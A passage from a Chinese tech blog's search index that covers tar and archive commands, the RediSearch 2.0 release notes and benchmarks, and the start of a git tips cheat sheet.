-tvf archive.tar         # 详细列出archive.tar中的所有文件。\ntar -xf archive.tar          # 从archive.tar提取所有文件。\n```\n\n#### zip格式\n\n压缩： zip -r [目标文件名].zip [原文件/目录名]  \n解压： unzip [原文件名].zip  \n注：-r参数代表递归  \n\n#### tar格式（该格式仅仅打包，不压缩）\n\n打包：tar -cvf [目标文件名].tar [原文件名/目录名]  \n解包：tar -xvf [原文件名].tar  \n注：c参数代表create（创建），x参数代表extract（解包），v参数代表verbose（详细信息），f参数代表filename（文件名），所以f后必须接文件名。  \n\n#### tar.gz格式\n\n方式一：利用前面已经打包好的tar文件，直接用压缩命令。\n\n压缩：gzip [原文件名].tar  \n解压：gunzip [原文件名].tar.gz  \n\n方式二：一次性打包并压缩、解压并解包\n\n打包并压缩： tar -zcvf [目标文件名].tar.gz [原文件名/目录名]  \n解压并解包： tar -zxvf [原文件名].tar.gz  \n注：z代表用gzip算法来压缩/解压。  \n\n#### tar.bz2格式\n\n方式一：利用已经打包好的tar文件，直接执行压缩命令：\n\n压缩：bzip2 [原文件名].tar  \n解压：bunzip2 [原文件名].tar.bz2  \n方式二：一次性打包并压缩、解压并解包  \n\n打包并压缩： tar -jcvf [目标文件名].tar.bz2 [原文件名/目录名]  \n解压并解包： tar -jxvf [原文件名].tar.bz2  \n注：小写j代表用bzip2算法来压缩/解压。  \n\n#### tar.xz格式\n\n方式一：利用已经打包好的tar文件，直接用压缩命令：\n\n压缩：xz [原文件名].tar  \n解压：unxz [原文件名].tar.xz  \n方式二：一次性打包并压缩、解压并解包  \n\n打包并压缩： tar -Jcvf [目标文件名].tar.xz [原文件名/目录名]  \n解压并解包： tar -Jxvf [原文件名].tar.xz  \n注：大写J代表用xz算法来压缩/解压。  \n\n#### tar.Z格式（已过时）\n\n方式一：利用已经打包好的tar文件，直接用压缩命令：\n\n压缩：compress [原文件名].tar  \n解压：uncompress [原文件名].tar.Z  \n方式二：一次性打包并压缩、解压并解包  \n\n打包并压缩： tar -Zcvf [目标文件名].tar.Z [原文件名/目录名]  \n解压并解包： tar -Zxvf [原文件名].tar.Z  \n注：大写Z代表用ncompress算法来压缩/解压。另，ncompress是早期Unix系统的压缩格式，但由于ncompress的压缩率太低，现已过时。  \n\n#### jar格式\n\n压缩：jar -cvf [目标文件名].jar [原文件名/目录名]  \n解压：jar -xvf [原文件名].jar  \n\n注：如果是打包的是Java类库，并且该类库中存在主类，那么需要写一个META-INF/MANIFEST.MF配置文件，内容如下：  \n\n```shell\nManifest-Version: 1.0\nCreated-By: 1.6.0_27 (Sun Microsystems Inc.)\nMain-class: the_name_of_the_main_class_should_be_put_here\n```\n\n然后用如下命令打包：\n\njar -cvfm [目标文件名].jar META-INF/MANIFEST.MF [原文件名/目录名]  \n这样以后就能用“java -jar [文件名].jar”命令直接运行主类中的public static void main方法了。  \n\n#### 7z格式\n\n压缩：7z a [目标文件名].7z [原文件名/目录名]  \n解压：7z x [原文件名].7z  \n注：这个7z解压命令支持rar格式，即：  \n\n7z x [原文件名].rar\n\n#### 其它例子\n\n**将文件全部打包成tar包** ：\n\n```shell\ntar -cvf log.tar log2012.log    仅打包，不压缩！\ntar -zcvf log.tar.gz log2012.log   打包后，以 gzip 压缩\ntar -jcvf log.tar.bz2 log2012.log  打包后，以 bzip2 压缩\n```\n\n在选项`f`之后的文件档名是自己取的，我们习惯上都用 .tar 来作为辨识。 如果加`z`选项，则以.tar.gz或.tgz来代表gzip压缩过的tar包；如果加`j`选项，则以.tar.bz2来作为tar包名。\n\n\n**解压目录**\n\n去掉第一层目录结构，要出除第二层，--strip-components 2\n\n```shell\ntar -xvf portal-web-v2.0.0.tar --strip-components 1  -C 指定目录\n```\n\n**查阅上述tar包内有哪些文件** ：\n\n```shell\ntar -ztvf log.tar.gz\n```\n\n由于我们使用 gzip 压缩的log.tar.gz，所以要查阅log.tar.gz包内的文件时，就得要加上`z`这个选项了。\n\n**将tar包解压缩** ：\n\n```shell\ntar -zxvf /opt/soft/test/log.tar.gz\n```\n\n在预设的情况下，我们可以将压缩档在任何地方解开的\n\n**只将tar内的部分文件解压出来** ：\n\n```shell\ntar -zxvf /opt/soft/test/log30.tar.gz log2013.log\n```\n\n我可以透过`tar -ztvf`来查阅 tar 包内的文件名称，如果单只要一个文件，就可以透过这个方式来解压部分文件！\n\n**文件备份下来，并且保存其权限** ：\n\n```shell\ntar -zcvpf log31.tar.gz log2014.log log2015.log log2016.log\n```\n\n这个`-p`的属性是很重要的，尤其是当您要保留原本文件的属性时。\n\n**在文件夹当中，比某个日期新的文件才备份** ：\n\n```shell\ntar -N \"2012/11/13\" -zcvf log17.tar.gz test\n```\n\n**备份文件夹内容是排除部分文件：**\n\n```shell\ntar --exclude scf/service -zcvf scf.tar.gz scf/*\n```\n\n**打包文件之后删除源文件：**\n\n```shell\ntar -cvf test.tar test --remove-files\n```\n\n**其实最简单的使用 tar 就只要记忆底下的方式即可：**\n\n```shell\n压　缩：tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称\n查　询：tar -jtv -f filename.tar.bz2\n解压缩：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tar"]},{"title":"高性能全文搜索引擎 RediSearch 2.0 正式发布！","url":"/release/redisearch-2-0/","content":"\nRediSearch 2.0.0 的 GA 版本现已发布，此版本在 RediSearch 1.0 的性能和可用性上进行了多项改进。这些改进需要对 API 进行一些向后的更改。具体更新内容如下：\n\n**Highlights**\n\n此版本改变了搜索索引与数据保持同步的方式。在 RediSearch 1.x 中，用户必须使用 FT.ADD 命令手动添加数据到索引中。在 RediSearch 2.x 中，用户的数据会根据键模式自动建立索引。\n\n这些变化旨在提高开发人员的工作效率，并确保用户的搜索索引始终与其数据保持同步。为了支持这一点，开发团队对 API 做了一些改动。\n\n除了简化索引之外，RediSearch 2.0 还允许用户使用 Redis cluster API 在多个 Redis shards 上扩展单个索引。\n\n最后，RediSearch 2.x 将其索引保留在 main Redis key space 之外。官方表示，其对索引代码的改进使查询性能提高了 2.4 倍。\n\n<!-- more -->\n\n**Details**\n\n- 创建索引时，必须指定前缀条件和/或过滤器。这决定了 RediSearch 将为哪些 hash 建立索引。\n- 现在，有几个 RediSearch 命令可以映射到它们的 Redis  equivalents：`FT.ADD`-> `HSET`、`FT.DEL`-> `DEL`（相当于 RediSearch 1.x 中带有 DD 标志的[`FT.DEL`](https://oss.redislabs.com/redisearch/Commands/#ftdel)）、`FT.GET`-> `HGETALL`、`FT.MGET`-> `HGETALL`。\n- RediSearch 索引不再驻留在 key space 中，并且索引不再保存到 RDB 中。\n- 用户可以[从 RediSearch 1.x 升级到 RediSearch2.x](https://oss.redislabs.com/redisearch/master/Upgrade_to_2.0/)。\n\n**Noteworthy changes**\n\n- [＃1246](https://github.com/RediSearch/RediSearch/pull/1246) 适用于 `FT.AGGREGATE` APPLY 操作的 [`geodistance`](https://oss.redislabs.com/redisearch/master/Aggregations/#list_of_geo_apply_functions) 函数。\n- [＃1394](https://github.com/RediSearch/RediSearch/pull/1394)：过期的文档（TTL）将从索引中删除。\n- [＃1394](https://github.com/RediSearch/RediSearch/pull/1394): 进行优化，以避免在更新非索引字段时重新索引文件。\n- [＃1384](https://github.com/RediSearch/RediSearch/pull/1384)：[`FT.DROPINDEX`](https://oss.redislabs.com/redisearch/Commands/#ftdropindex)，默认情况下不会删除该索引下的文档（请参见已弃用的`FT.DROP`）。\n- [＃1385](https://github.com/RediSearch/RediSearch/pull/1385)：在[`FT.INFO`](https://oss.redislabs.com/redisearch/master/Commands/#ftinfo)response 中添加索引定义。\n- [＃1097](https://github.com/RediSearch/RediSearch/pull/1097)：添加 Hindi snowball stemmer。\n- RediSearch 2.x 需要 Redis 6.0 或更高版本。\n- ......\n\n---\n\n## This is the GA release for RedisSearch 2.0.\n\nThis is the GA release for RedisSearch 2.0. This release includes several improvements in performance and usability over RediSearch 1.0. These improvements necessitate a few backward-breaking changes to the API.\n\n### Highlights\n\nFor this release, we changed the way in which the search indexes are kept in sync with your data. In RediSearch 1.x, you had to manually add data to your indexes using the `FT.ADD` command. In RediSearch 2.x, your data is indexed automatically based on a key pattern.\n\nThese changes are designed to enhance developer productivity, and to ensure that\nyour search indexes are always kept in sync with your data. To support this, we've\nmade a few changes to the API.\n\nIn addition to simplifying indexing, RediSearch 2.0 allows you to scale a single index over multiple Redis shards using the Redis cluster API.\n\nFinally, RediSearch 2.x keeps its indexes outside of the main Redis key space. Improvements to the indexing code have increased query performance 2.4x.\n\nYou can read more details in [the RediSearch 2.0 announcement blog post](https://redislabs.com/blog/introducing-redisearch-2-0/), and you can get started by checking out this [quick start blog post](https://redislabs.com/blog/getting-started-with-redisearch-2-0/).\n[![architecture](https://up-img.yonghong.tech/pic/2020/09/27-16-08-newarchitecture-jhGq6x.png)](https://github.com/RediSearch/RediSearch/blob/master/docs/img/newarchitecture.png)\n\n### Details\n\n- When you create an index, you must specify a prefix condition and/or a filter. This determines which hashes RediSearch will index.\n- Several RediSearch commands now map to their Redis equivalents: `FT.ADD` -> `HSET`, `FT.DEL` -> `DEL` (equivalent to [`FT.DEL` with the DD flag in RediSearch 1.x](https://oss.redislabs.com/redisearch/Commands/#ftdel)), `FT.GET` -> `HGETALL`, `FT.MGET` -> `HGETALL`.\n- RediSearch indexes no longer reside within the key space, and the indexes are no longer saved to the RDB.\n- You can [upgrade from RediSearch 1.x to RediSearch 2.x](https://oss.redislabs.com/redisearch/master/Upgrade_to_2.0/).\n\n### Noteworthy changes\n\n- [#1246](https://github.com/RediSearch/RediSearch/pull/1246): [`geodistance`](https://oss.redislabs.com/redisearch/master/Aggregations/#list_of_geo_apply_functions) function for `FT.AGGREGATE` APPLY operation.\n- [#1394](https://github.com/RediSearch/RediSearch/pull/1394): Expired documents (TTL) will be removed from the index.\n- [#1394](https://github.com/RediSearch/RediSearch/pull/1394): [Optimization](https://oss.redislabs.com/redisearch/master/Configuring/#partial_indexed_docs) to avoid reindexing documents when non-indexed fields are updated.\n- After [index creation](https://oss.redislabs.com/redisearch/Commands/#ftcreate), an initial scan starts for existing documents. You can check the status of this scan by calling [`FT.INFO`](https://oss.redislabs.com/redisearch/Commands/#ftinfo) and looking at the `indexing` and `percent_indexed` values. While `indexing` is true, queries return partial results.\n- [#1435](https://github.com/RediSearch/RediSearch/pull/1435): `NOINITIALINDEX` flag on [`FT.CREATE`](https://oss.redislabs.com/redisearch/Commands/#ftcreate) to skip the initial scan of documents on index creation.\n- [#1401](https://github.com/RediSearch/RediSearch/pull/1401): Support upgrade from v1.x and for reading RDB's created by RediSearch 1.x ([more information](https://oss.redislabs.com/redisearch/master/Upgrade_to_2.0/)).\n- [#1445](https://github.com/RediSearch/RediSearch/pull/1445): Support for load event. This event indexes documents when they are loaded from RDB, ensuring that indexes are fully available when RDB loading is complete (available from Redis 6.0.7 and above).\n- [#1384](https://github.com/RediSearch/RediSearch/pull/1384): [`FT.DROPINDEX`](https://oss.redislabs.com/redisearch/Commands/#ftdropindex), which by default does not delete documents underlying the index (see deprecated `FT.DROP`).\n- [#1385](https://github.com/RediSearch/RediSearch/pull/1385): Add index definition to [`FT.INFO`](https://oss.redislabs.com/redisearch/master/Commands/#ftinfo) response.\n- [#1097](https://github.com/RediSearch/RediSearch/pull/1097): Add Hindi snowball stemmer.\n- The `FT._LIST` command returns a list of all available indices. Note that this is a temporary command, as indicated by the `_` in the name, so it's not documented. We're working on a [`SCAN`](https://redis.io/commands/scan)-like command for databases with many indexes.\n- The RediSearch version will appear in Redis as `20000`, which is equivalent to 2.0.0 in semantic versioning. Since the version of a module in Redis is numeric, we cannot explicitly add an GA flag.\n- RediSearch 2.x requires Redis 6.0 or later.\n\n### Behavior changes\n\nPlease familiarize yourself with these changes before upgrading to RediSearch 2.0:\n\n- [#1381](https://github.com/RediSearch/RediSearch/pull/1381): `FT.SYNADD` is removed; use [`FT.SYNUPDATE`](https://oss.redislabs.com/redisearch/Commands/#ftsynupdate) instead. `FT.SYNUPDATE` requires both\n  and index name and a synonym group ID. This ID can be any ASCII string.\n\n- [#1437](https://github.com/RediSearch/RediSearch/pull/1437): Documents that expire during query execution time will not appear in the results (but might have been counted in the number of produced documents).\n\n- [#1221](https://github.com/RediSearch/RediSearch/pull/1221): Synonyms support for lower case. This can result in a different result set on FT.SEARCH when using synonyms.\n\n- RediSearch will not index hashes whose fields do not match an existing index schema. You can see the number of hashes not indexed using [`FT.INFO`](https://oss.redislabs.com/redisearch/Commands/#ftinfo) - `hash_indexing_failures `. The requirement for adding support for partially indexing and blocking is captured here: [#1455](https://github.com/RediSearch/RediSearch/pull/1455).\n\n- Removed support for `NOSAVE` (for details see [v1.6 docs](https://oss.redislabs.com/redisearch/1.6/Commands/#ftadd)).\n\n- RDB loading will take longer due to the index not being persisted.\n\n- Field names in the [query syntax](https://oss.redislabs.com/redisearch/Query_Syntax/) are now case-sensitive.\n\n- Deprecated commands:\n\n  - `FT.DROP` (replaced by `FT.DROPINDEX`, which by default keeps the documents)\n  - `FT.ADD` (mapped to `HSET` for backward compatibility)\n  - `FT.DEL` (mapped to `DEL` for backward compatibility)\n  - `FT.GET` (mapped to `HGETALL` for backward compatibility)\n  - `FT.MGET` (mapped to `HGETALL` for backward compatibility)\n\n- Removed commands:\n\n  - `FT.ADDHASH` (no longer makes sense)\n  - `FT.SYNADD` (see [#1381](https://github.com/RediSearch/RediSearch/pull/1381))\n  - `FT.OPTIMIZE` (see [v1.6 docs](https://oss.redislabs.com/redisearch/1.6/Commands/#ftoptimize))\n\n### Scaling a single index over multiple shards with the open source Redis cluster API\n\nPreviously, a single RediSearch index, and its documents, had to reside on a single shard. This meant that dataset size and throughput was bound to what a single Redis process could handle.\n\nRedis Enterprise offered the ability to distribute documents in a clustered database and aggregate the results at query time. This fan-out and aggregation is handled by a component called the “coordinator” that is now also available under the same [Redis Source Available License] for all Redis OSS users in it's own repository [RSCoordinator](https://github.com/RediSearch/RSCoordinator).\n\nNotes:\n\n- The version inside Redis will be 20000 or 2.0.0 in semantic versioning. Since the version of a module in Redis is numeric, we could not add an GA flag.\n- Requires Redis v6 or above.\n\n---\n\n## Introducing RediSearch 2.0\n\n> RediSearch 2.0 is designed to improve the developer experience and be the most scalable version of RediSearch. Plus: it’s 2.4x faster than the previous version.\n\nRediSearch, a real-time secondary index with full-text search capabilities for Redis, is one of the most mature and feature-rich Redis modules. It is also becoming even more popular every day—in the past few months RediSearch Docker pulls have jumped 500%! That soaring popularity has led customers to come up with a wide variety of interesting use cases ranging from [real-time inventory management](https://redislabs.com/solutions/use-cases/real-time-inventory/) to [ephemeral search](https://redislabs.com/blog/the-case-for-ephemeral-search/).\n\nTo extend that momentum, we’re now introducing the public preview of RediSearch 2.0, designed to **improve the developer experience** and be **the most scalable version of Redisearch**. RediSearch 2.0 supports Redis Labs’ [Active-Active geo-distribution](https://redislabs.com/redis-enterprise/technology/active-active-geo-distribution/) technology, is [scalable](https://redislabs.com/redis-enterprise/technology/linear-scaling-redis-enterprise/) without downtime, and includes [Redis on Flash](https://redislabs.com/redis-enterprise/technology/redis-on-flash/) support (currently in private preview). To meet those goals without negatively impacting performance, we created a brand new architecture for RediSearch 2.0—and it worked: **RediSearch 2.0 is 2.4x faster** than RediSearch 1.6. \n\n### Inside RediSearch 2.0’s new architecture \n\nHaving a rich query-and-aggregation engine in your Redis database enables a wide variety of new use cases that extend well beyond caching. RediSearch lets you use Redis as your primary database in situations where you need to access data using complex queries. Even better, it preserves Redis’ world-class speed, reliability, and scalability, and doesn’t require you to add complexity to the code to let you update and index data. \n\nFor RediSearch 2.0 we re-architected the way indices are kept in sync with the data. Instead of having to write data through the index (using the FT.ADD command), RediSearch now follows the data written in hashes and synchronously indexes it. This re-architecture comes with several changes in the API, which we discussed in a previous post when [RediSearch 2.0 Hit Its First Milestone](https://redislabs.com/blog/redisearch-2-0-hits-its-first-milestone/).\n\n![img](https://up-img.yonghong.tech/pic/2020/09/27-16-10-redisearch-architecture-1-hBkQjU.png)\n\nThis new architecture brings two main benefits. First, it’s now easier than ever to create a secondary index on top of your existing data. You can just **add RediSearch to your existing Redis database, create an index, and start querying it**, without having to migrate your data or use new commands for adding data to the index. This drastically lowers the learning curve for new RediSearch users and lets you create indexes on your existing Redis databases—without even having to restart them.\n\nIn addition to implementing a new way to index data, we also took the index out of the keyspace. This enables Redis Enterprise’s [Active-Active technology](https://redislabs.com/redis-enterprise/technology/active-active-geo-distribution/), which is based on [conflict-free replicated data types (CRDTs)](https://redislabs.com/blog/diving-into-crdts/). Merging two inverted indices conflict-free is difficult, but Redis Labs already has [a proven](https://redislabs.com/case-studies/mutualink/) [CRDTs implementation](https://redislabs.com/videos/active-active-geo-distribution-redis-enterprise/) of Hashes. So the second big benefit of **this new architecture is making RediSearch 2.0 even more scalable**. Because RediSearch now follows Hashes and the index was moved out of the keyspace, you can now run RediSearch in an Active-Active geo-distributed database.\n\n![img](https://up-img.yonghong.tech/pic/2020/09/27-16-10-redisearch-active-active-1-Aor8lj.png)*Active-Active technology seamlessly resolves conflicts between documents, and RediSearch updates local indices accordingly.*\n\nA document will be replicated to all databases in the replication set in a [strongly eventual consistent manner](https://redislabs.com/docs/under-the-hood/). In each replica, RediSearch will simply follow all the updates on the Hashes, which means all indices are strongly eventual consistent as well.\n\n### OSS cluster support for open source Redis\n\nWe didn’t want to limit increasing the scalability capabilities to only Redis Enterprise users, so we added support for scaling a single index over multiple shards with the open source Redis cluster API. Previously, a single RediSearch index, and its documents, had to reside on a single shard. This meant that dataset size and throughput for OSS Redis was bound to what a single Redis process could handle. Redis Enterprise offered the ability to distribute documents in a clustered database and aggregate the results at query time. This fan-out and aggregation is handled by a component called the “coordinator” that is now also [publicly available ](https://github.com/RedisLabsModules/RSCoordinator)under the [Redis Source Available License](https://redislabs.com/legal/licenses/) so it will work with open source Redis clusters as well as Redis Enterprise. The result is the most scalable version of RediSearch yet. \n\n### Show me the numbers!\n\nTo assess RediSearch 2.0’s ingestion performance, we extended our full-text search benchmark ([FTSB](https://github.com/RediSearch/ftsb)) suite with [the publicly available NYC Taxi dataset](https://www1.nyc.gov/site/tlc/about/tlc-trip-record-data.page). This dataset is used across the industry due to its rich set of data types (text, tag, geographic, and numeric), and a large number of documents. \n\nThis benchmark focuses on write performance, using trip-record data of rides in yellow cabs in New York City. Specifically for this benchmark we used the January 2015 dataset, which loads more than 12 million documents with an average size of 500 bytes per document. For the full benchmark specification please refer to the [FTSB on GitHub](https://github.com/RediSearch/ftsb/blob/master/docs/nyc_taxis-benchmark/description.md).\n\nAll benchmark variations were run on Amazon Web Services instances, provisioned through our benchmark-testing infrastructure. The tests were executed on a 3-node cluster with 15 shards, with RediSearch Enterprise versions 1.6 and 2.0. Both the benchmarking client and the 3 nodes comprising the database with RediSearch enabled were running on separate c5.9xlarge instances.\n\nGiven that RediSearch 2.0 comes with the ability to follow changes in Hashes in Redis and automatically index them, we’ve added variants for the [FT.ADD](https://oss.redislabs.com/redisearch/Commands/#ftadd) and [HSET](https://redis.io/commands/hset) commands. To make upgrades easier, we remapped the now deprecated FT.ADD command to the HSET commands in RediSearch 2.0. The two charts below display overall ingestion rate and latency for both RediSearch 1.6 and RediSearch 2.0, while retaining sub-millisecond latencies.\n\n![img](https://up-img.yonghong.tech/pic/2020/09/27-16-10-redisearch-2.0-graph-1-1024x639-pz1WCV.png)\n\n![img](https://up-img.yonghong.tech/pic/2020/09/27-16-10-redisearch-2.0-graph-2-1024x658-EArYyF.png)\n\n[RediSearch has always been fast](https://redislabs.com/blog/redisearch-1-6-boosts-performance-up-to-64/), but with this architectural change we’ve moved from indexing 96K documents per second to 132K docs/sec at an overall p50 ingestion latency of 0.4ms, drastically improving write scaling. \n\nNot only will you benefit from the boost in the throughput, but each ingestion also becomes faster. Apart from the overall ingestion improvement due to the changes in architecture, you can now also rely on the OSS Redis Cluster API capabilities to linearly scale the ingestion of your search database. \n\nCombining throughput and latency improvements, **RediSearch 2.0 delivers up to a 2.4X speedup** compared to the RediSearch 1.6.\n\n### What’s next for RediSearch 2.0\n\nTo sum up, **RediSearch 2.0 is the fastest and most scalable version for all Redis users that we have ever released.** In addition, RediSearch 2.0’s new architecture improves the developer experience of creating indices for existing data within Redis in a seamless manner and removes the need to migrate your Redis data to another RediSearch-enabled database. This new architecture allows RediSearch to follow and auto-index other data structures, such as Streams or Strings. In upcoming releases, it will let you work with additional data structures such as the nested data structure in [RedisJSON](https://redislabs.com/modules/redis-json/). \n\nWe plan to keep on adding more features to further enhance the developer experience. Coming next, look for a new command that allows you to profile your search queries to better understand where performance bottlenecks occur during query execution.\n\nReady to get started? Check out Tug Grall’s blog on …[ Getting Started with RediSearch 2.0](https://redislabs.com/blog/getting-started-with-redisearch-2-0/)! Then follow the steps in this [tutorial on GitHub](https://github.com/RediSearch/redisearch-getting-started) or create a free database in [Redis Enterprise Cloud Essentials](https://redislabs.com/try-free/). (Note that the public preview of RediSearch 2.0 is available in two Redis Enterprise Cloud Essentials regions: Mumbai and Oregon.)","categories":["release"],"tags":["release","RediSearch","Redis","高性能","全文搜索"]},{"title":"Git 的奇技淫巧","url":"/tips/git-tips/","content":"\nhttps://github.com/521xueweihan/git-tips\n\nGit 是一个 “分布式版本管理工具”，简单的理解版本管理工具：大家在写东西的时候都用过 “回撤” 这个功能，但是回撤只能回撤几步，假如想要找回我三天之前的修改，光用 “回撤” 是找不回来的。而 “版本管理工具” 能记录每次的修改，只要提交到版本仓库，你就可以找到之前任何时刻的状态（文本状态）。\n\n下面的内容就是列举了常用的 Git 命令和一些小技巧，可以通过 \"页面内查找\" 的方式进行快速查询：`Ctrl/Command+f`。\n\n## 开卷必读\n*如果之前未使用过 Git，可以学习 [Git 小白教程](https://rogerdudler.github.io/git-guide/index.zh.html)入门*\n\n1. **一定要先测试命令的效果后**，再用于工作环境中，以防造成不能弥补的后果！**到时候别拿着砍刀来找我**\n2. 所有的命令都在`git version 2.7.4 (Apple Git-66)`下测试通过\n3. 统一概念：\n\t- 工作区：改动（增删文件和内容）\n\t- 暂存区：输入命令：`git add 改动的文件名`，此次改动就放到了 ‘暂存区’\n\t- 本地仓库(简称：本地)：输入命令：`git commit 此次修改的描述`，此次改动就放到了 ’本地仓库’，每个 commit，我叫它为一个 ‘版本’。\n\t- 远程仓库(简称：远程)：输入命令：`git push 远程仓库`，此次改动就放到了 ‘远程仓库’（GitHub 等)\n\t- commit-id：输出命令：`git log`，最上面那行 `commit xxxxxx`，后面的字符串就是 commit-id\n4. 如果喜欢这个项目，欢迎 Star、提交 Pr、[反馈问题](https://github.com/521xueweihan/git-tips/issues)😊\n\n<!-- more -->\n\n## 目录\n\n  - [开卷必读](#开卷必读)\n  - [目录](#目录)\n  - [展示帮助信息](#展示帮助信息)\n  - [回到远程仓库的状态](#回到远程仓库的状态)\n  - [重设第一个 commit](#重设第一个-commit)\n  - [查看冲突文件列表](#查看冲突文件列表)\n  - [展示工作区和暂存区的不同](#展示工作区和暂存区的不同)\n  - [展示暂存区和最近版本的不同](#展示暂存区和最近版本的不同)\n  - [展示暂存区、工作区和最近版本的不同](#展示暂存区工作区和最近版本的不同)\n  - [快速切换到上一个分支](#快速切换到上一个分支)\n  - [删除已经合并到 master 的分支](#删除已经合并到-master-的分支)\n  - [展示本地分支关联远程仓库的情况](#展示本地分支关联远程仓库的情况)\n  - [关联远程分支](#关联远程分支)\n  - [列出所有远程分支](#列出所有远程分支)\n  - [列出本地和远程分支](#列出本地和远程分支)\n  - [查看远程分支和本地分支的对应关系](#查看远程分支和本地分支的对应关系)\n  - [远程删除了分支本地也想删除](#远程删除了分支本地也想删除)\n  - [创建并切换到本地分支](#创建并切换到本地分支)\n  - [从远程分支中创建并切换到本地分支](#从远程分支中创建并切换到本地分支)\n  - [删除本地分支](#删除本地分支)\n  - [删除远程分支](#删除远程分支)\n  - [重命名本地分支](#重命名本地分支)\n  - [查看标签](#查看标签)\n  - [查看标签详细信息](#查看标签详细信息)\n  - [本地创建标签](#本地创建标签)\n  - [推送标签到远程仓库](#推送标签到远程仓库)\n  - [删除本地标签](#删除本地标签)\n  - [删除远程标签](#删除远程标签)\n  - [切回到某个标签](#切回到某个标签)\n  - [放弃工作区的修改](#放弃工作区的修改)\n  - [恢复删除的文件](#恢复删除的文件)\n  - [以新增一个 commit 的方式还原某一个 commit 的修改](#以新增一个-commit-的方式还原某一个-commit-的修改)\n  - [回到某个 commit 的状态，并删除后面的 commit](#回到某个-commit-的状态并删除后面的-commit)\n  - [修改上一个 commit 的描述](#修改上一个-commit-的描述)\n  - [查看 commit 历史](#查看-commit-历史)\n  - [查看某段代码是谁写的](#查看某段代码是谁写的)\n  - [显示本地更新过 HEAD 的 git 命令记录](#显示本地更新过-head-的-git-命令记录)\n  - [修改作者名](#修改作者名)\n  - [修改远程仓库的 url](#修改远程仓库的-url)\n  - [增加远程仓库](#增加远程仓库)\n  - [列出所有远程仓库](#列出所有远程仓库)\n  - [查看两个星期内的改动](#查看两个星期内的改动)\n  - [把 A 分支的某一个 commit，放到 B 分支上](#把-a-分支的某一个-commit放到-b-分支上)\n  - [给 git 命令起别名](#给-git-命令起别名)\n  - [存储当前的修改，但不用提交 commit](#存储当前的修改但不用提交-commit)\n  - [保存当前状态，包括 untracked 的文件](#保存当前状态包括-untracked-的文件)\n  - [展示所有 stashes](#展示所有-stashes)\n  - [回到某个 stash 的状态](#回到某个-stash-的状态)\n  - [回到最后一个 stash 的状态，并删除这个 stash](#回到最后一个-stash-的状态并删除这个-stash)\n  - [删除所有的 stash](#删除所有的-stash)\n  - [从 stash 中拿出某个文件的修改](#从-stash-中拿出某个文件的修改)\n  - [展示所有 tracked 的文件](#展示所有-tracked-的文件)\n  - [展示所有 untracked 的文件](#展示所有-untracked-的文件)\n  - [展示所有忽略的文件](#展示所有忽略的文件)\n  - [强制删除 untracked 的文件](#强制删除-untracked-的文件)\n  - [强制删除 untracked 的目录](#强制删除-untracked-的目录)\n  - [展示简化的 commit 历史](#展示简化的-commit-历史)\n  - [把某一个分支导出成一个文件](#把某一个分支导出成一个文件)\n  - [从包中导入分支](#从包中导入分支)\n  - [执行 rebase 之前自动 stash](#执行-rebase-之前自动-stash)\n  - [从远程仓库根据 ID，拉下某一状态，到本地分支](#从远程仓库根据-id拉下某一状态到本地分支)\n  - [详细展示一行中的修改](#详细展示一行中的修改)\n  - [清除 gitignore 文件中记录的文件](#清除-gitignore-文件中记录的文件)\n  - [展示所有 alias 和 configs](#展示所有-alias-和-configs)\n  - [展示忽略的文件](#展示忽略的文件)\n  - [commit 历史中显示 Branch1 有的，但是 Branch2 没有 commit](#commit-历史中显示-branch1-有的但是-branch2-没有-commit)\n  - [在 commit log 中显示 GPG 签名](#在-commit-log-中显示-gpg-签名)\n  - [删除全局设置](#删除全局设置)\n  - [新建并切换到新分支上，同时这个分支没有任何 commit](#新建并切换到新分支上同时这个分支没有任何-commit)\n  - [展示任意分支某一文件的内容](#展示任意分支某一文件的内容)\n  - [clone 下来指定的单一分支](#clone-下来指定的单一分支)\n  - [clone 最新一次提交](#clone-最新一次提交)\n  - [忽略某个文件的改动](#忽略某个文件的改动)\n  - [忽略文件的权限变化](#忽略文件的权限变化)\n  - [以最后提交的顺序列出所有 Git 分支](#以最后提交的顺序列出所有-git-分支)\n  - [在 commit log 中查找相关内容](#在-commit-log-中查找相关内容)\n  - [把暂存区的指定 file 放到工作区中](#把暂存区的指定-file-放到工作区中)\n  - [强制推送](#强制推送)\n  - [git 配置 http 和 socks 代理](#git-配置-http-和-socks-代理)\n  - [git 配置 ssh 代理](#git-配置-ssh-代理)\n  - [脑图](#脑图)\n  - [优雅的Commit信息](#优雅的commit信息)\n  - [commit工具](#commit工具)\n\n## 展示帮助信息\n```sh\ngit help -g\n```\nThe command output as below:\n\n```\nThe common Git guides are:\n   attributes          Defining attributes per path\n   cli                 Git command-line interface and conventions\n   core-tutorial       A Git core tutorial for developers\n   cvs-migration       Git for CVS users\n   diffcore            Tweaking diff output\n   everyday            A useful minimum set of commands for Everyday Git\n   glossary            A Git Glossary\n   hooks               Hooks used by Git\n   ignore              Specifies intentionally untracked files to ignore\n   modules             Defining submodule properties\n   namespaces          Git namespaces\n   repository-layout    Git Repository Layout\n   revisions           Specifying revisions and ranges for Git\n   tutorial            A tutorial introduction to Git\n   tutorial-2          A tutorial introduction to Git: part two\n   workflows           An overview of recommended workflows with Git\n\n'git help -a' and 'git help -g' list available subcommands and some concept guides. See 'git help <command>' or 'git help <concept>' to read about a specific subcommand or concept.\n```\n\n## 回到远程仓库的状态\n\n抛弃本地所有的修改，回到远程仓库的状态。\n```sh\ngit fetch --all && git reset --hard origin/master\n```\n\n## 重设第一个 commit\n\n也就是把所有的改动都重新放回工作区，并**清空所有的 commit**，这样就可以重新提交第一个 commit 了\n\n```sh\ngit update-ref -d HEAD\n```\n\n## 查看冲突文件列表\n\n展示工作区的冲突文件列表\n```sh\ngit diff --name-only --diff-filter=U\n```\n## 展示工作区和暂存区的不同\n\n输出**工作区**和**暂存区**的 different (不同)。\n\n```sh\ngit diff\n```\n\n还可以展示本地仓库中任意两个 commit 之间的文件变动：\n```sh\ngit diff <commit-id> <commit-id>\n```\n\n## 展示暂存区和最近版本的不同\n\n输出**暂存区**和本地最近的版本 (commit) 的 different (不同)。\n```sh\ngit diff --cached\n```\n\n## 展示暂存区、工作区和最近版本的不同\n\n输出**工作区**、**暂存区** 和本地最近的版本 (commit) 的 different (不同)。\n\n```sh\ngit diff HEAD\n```\n\n## 快速切换到上一个分支\n\n```sh\ngit checkout -\n```\n\n## 删除已经合并到 master 的分支\n\n```sh\ngit branch --merged master | grep -v '^\\*\\| 